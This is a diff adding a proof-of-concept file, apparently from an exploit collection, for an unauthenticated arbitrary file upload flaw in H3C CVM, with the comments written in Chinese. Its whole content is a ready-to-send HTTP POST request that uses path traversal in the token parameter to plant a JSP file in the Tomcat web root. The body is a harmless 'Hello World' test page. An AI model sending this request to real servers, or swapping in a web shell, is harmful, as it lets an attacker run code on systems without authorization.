@@ -1,0 +1,11 @@
+# H3C CVM_fileUpload前台任意文件上传漏洞
+# H3C CVM存在前台任意文件上传漏洞
+POST /cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/debugg.jsp&name=222&acid=80000909&bid=hd_tag_m8mv25yh HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25yh
+RM-PRO-Token: d731a3dbb43da882e27eccdb66641aee
+RM-PRO-Time: 1742808514229
+Content-range: bytes 0-10/20
+User-Agent: curl/7.83.1
+
+<%out.print("Hello World!");%>
